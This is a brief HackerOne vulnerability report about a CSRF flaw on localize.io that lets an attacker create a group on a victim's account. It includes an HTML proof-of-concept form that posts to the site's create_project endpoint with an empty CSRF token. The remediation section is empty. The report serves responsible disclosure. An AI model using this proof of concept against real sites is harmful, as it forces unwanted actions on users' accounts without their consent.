# HackerOne Report: Group Creation Via CSRF
**Report ID:** 8216
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hi Team,

I have found a CSRf vulnerability using which the attacker can create a group on any users account as the anti-csrf token is not getting vlaidated on the server-side. 


Group Creation Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="addGroup[name]" value="test" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

## Discussion & Remediation Timeline
